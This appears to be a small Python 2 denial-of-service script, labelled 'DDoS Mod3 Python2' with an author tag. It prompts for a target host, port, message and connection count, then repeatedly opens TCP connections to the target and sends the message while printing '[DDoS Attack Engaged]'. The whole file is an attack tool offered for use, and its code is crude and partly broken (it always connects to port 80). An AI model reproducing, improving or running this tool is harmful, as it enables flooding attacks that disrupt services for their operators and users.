import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
print ("DDoS Mod3 Python2")
print ("AUTOR : Xalbador CODE : XLBDR")
host=raw_input( "Ip:" )
port=input( "Port:" )
message=raw_input( "send:" )
conn=input( "make:" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Xalbador " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[DDoS Attack Engaged]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = raw_input("Do you want to ddos more?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
